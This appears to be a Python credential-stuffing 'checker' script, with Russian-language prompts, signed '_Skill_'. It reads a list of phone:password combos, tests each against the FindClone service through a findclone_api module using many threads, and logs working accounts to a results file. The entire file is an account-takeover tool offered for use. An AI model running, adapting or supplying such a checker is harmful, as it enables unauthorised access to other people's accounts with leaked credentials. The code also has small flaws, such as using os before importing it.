import logging, findclone_api

info = 'Checker by _Skill_'
logging.basicConfig(level=logging.INFO)


class Checker(object):
    def __init__(self):
        import datetime
        self.acc_array = []
        self.date = datetime.datetime.now().strftime("%d%m%Y-%H%M%S")
        try:
            self.filename = open('./results/FindClone-{}.txt'.format(self.date), 'a')
        except FileNotFoundError:
            os.mkdir('results')
            self.filename = open('./results/FindClone-{}.txt'.format(self.date), 'a')


    def load(self, base_path):
        file = open(base_path, 'r', encoding='latin-1').readlines()
        file = [combos.rstrip() for combos in file]
        for lines in file:
            data = lines.replace('\n', '').split(':')
            try:
                data[1] += ''
            except IndexError:
                data.append('1')
            self.acc_array.append({'ph': data[0],
                                   'pw': data[1]})

    def write_info(self, info):
        logging.info('Новый аккаунт')
        self.filename.write(info)
        self.filename.flush()


    def login(self, acc):
        phone = acc['ph']
        password = acc['pw']
        result = findclone_api.check(phone, password)
        if result != None:
            self.write_info(result)


    def main(self, threads):
        from multiprocessing.dummy import Pool
        self.load(base_path)
        self.threads = threads
        pool = Pool(self.threads)
        for _ in pool.imap_unordered(self.login, self.acc_array):
            pass



if __name__ == '__main__':
    import time, os
    logging.info(info)
    while True:
        try:
            path = input('Выберите базу --> ')
            threads = int(input('Количество потоков --> '))
            base_path = os.path.abspath(r''.join(path)).replace('\\', '/')
            start = time.time()
            Checker().main(threads)
            logging.info('Закончено за {} сек.\n--------------------'.format(str(round(time.time() - start, 2))))
        except KeyboardInterrupt:
            logging.info('Остановлено')
            os._exit(1)
        #except:
         #   logging.error('Что-то пошло не так')
